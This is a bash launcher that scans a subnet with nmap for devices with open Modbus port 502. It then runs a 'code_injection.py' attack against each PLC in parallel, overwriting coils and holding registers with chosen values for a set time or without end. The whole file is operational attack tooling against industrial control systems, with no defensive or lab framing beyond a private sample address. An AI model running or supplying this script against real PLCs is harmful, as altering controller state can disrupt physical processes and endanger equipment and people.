#!/bin/bash

# Function to handle the termination signal (Ctrl+C)
cleanup() {
    echo "Stopping all attacks..."
    # Kill all background jobs (in this case, the attacks)
    kill $(jobs -p)
    wait
    echo "All attacks have been stopped."
    exit 0
}

# Set trap to call cleanup function on SIGINT (Ctrl+C)
trap cleanup SIGINT

# Prompt the user for the network address (subnet)
read -p "Enter the network address (e.g., 192.168.60.0/24): " network_address

# Extract the base network address (first three octets) from the user input
network_prefix=$(echo $network_address | cut -d'.' -f1-3)

# Prompt the user for other attack parameters
read -p "Enter the port number for the attack (default 502): " attack_port
attack_port=${attack_port:-502}  # Default to 502 if no input is provided

# Get the IP addresses of Modbus PLCs by dynamically adjusting the IP prefix
plc_ips=$(nmap -p $attack_port --open $network_address | grep -oP "$network_prefix\.\d+")


read -p "Enter the mode of the attack (up or down): " attack_mode

read -p "Enter the number of coils to be manipulated (default 100): " n_coils
n_coils=${n_coils:-100}  # Default to 100 if no input is provided

read -p "Enter the number of holding registers to be manipulated (default 100): " n_holding_registers
n_holding_registers=${n_holding_registers:-100}  # Default to 100 if no input is provided

read -p "Enter the value to be written to the holding registers (default 0): " hr_value
hr_value=${hr_value:-0}  # Default to 0 if no input is provided

read -p "Enter the attack duration time in seconds (default 0): " attack_time
attack_time=${attack_time:-0}  # Default to 0 seconds if no input is provided

# Loop through each IP address and pass it to the Python script in parallel
for ip in $plc_ips; do
    
    # Run the Python script with the user inputs as arguments
    python3 code_injection.py --ip $ip --port $attack_port --mode $attack_mode --n_coils $n_coils --n_holding_registers $n_holding_registers --hr_value $hr_value --time $attack_time &
done

# Wait for all background processes to finish (though attacks are infinite, so this will wait indefinitely)
wait
